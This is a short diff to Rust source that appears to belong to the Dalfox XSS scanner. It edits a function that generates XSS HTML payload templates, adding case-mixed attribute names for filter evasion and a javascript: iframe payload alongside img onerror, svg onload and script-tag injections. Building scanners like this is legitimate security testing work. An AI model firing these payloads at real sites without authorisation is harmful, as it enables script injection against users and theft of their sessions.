@@ -5,15 +5,16 @@
 pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     let templates = [
         // CLASS
-        "<IMG src=x onerror={JS} class=dalfox>",
-        "<sVg onload={JS} class=dalfox>",
-        "<sCrIpt/class=dalfox>{JS}</scRipT>",
+        "<IMG src=x onerror={JS} ClAss=dalfox>",
+        "<sVg onload={JS} claSS=dalfox>",
+        "<sCrIpt/cLaSs=dalfox>{JS}</scRipT>",
         "<xmp><p title=\"</xmp><svg/onload={JS}) class=dalfox>",
-        "<details open ontoggle={JS}>",
+        "<details open ontoggle={JS} class=dalfox>",
+        "<iFrAme/src=JaVAsCrIPt:{JS} ClAss=dalfox>",
         // ID
         "<IMG src=x onerror={JS} id=dalfox>",
-        "<sVg onload={JS} id=dalfox>",
-        "<sCrIpt/id=dalfox>{JS}</scRipT>",
+        "<sVg onload={JS} iD=dalfox>",
+        "<sCrIpt/ID=dalfox>{JS}</scRipT>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
